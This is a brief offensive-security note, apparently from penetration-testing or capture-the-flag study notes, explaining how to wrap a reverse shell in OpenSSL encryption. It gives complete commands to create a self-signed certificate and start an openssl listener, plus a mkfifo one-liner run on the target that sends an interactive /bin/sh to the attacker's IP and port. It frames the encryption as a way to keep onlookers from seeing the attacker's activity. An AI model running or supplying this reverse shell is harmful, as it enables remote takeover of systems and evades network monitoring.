### OpenSSL technique

- When you're using a normal netcat connection you generally are in an unencrypted connection line which can be intercepted by another third party who could be breaching the network. Even though you have a reverse shell connection a third party can see everything you're doing. 

- That's why you want to make use of an OpenSSL server with self-signed keys and certificates which can allow a client/server encrypted channel in order for you to run your reverse shell, plus you don't even need netcat because you simply use mkfifo in order to connect to an OpenSSL server.

- You firstly need to create the openssl keys and the certificate which can be generated like this: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

- Then you need to open the openssl server and listen out on a specific port which you're going to connect the connection to: openssl s_server -quiet -key key.pem -cert cert.pem -port (Number)

- You then form the connection from the target box from which you need RCE: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect (Attacker IP:Port) > /tmp/s; rm /tmp/s 

You now have an encrypted channel using openssl encryption
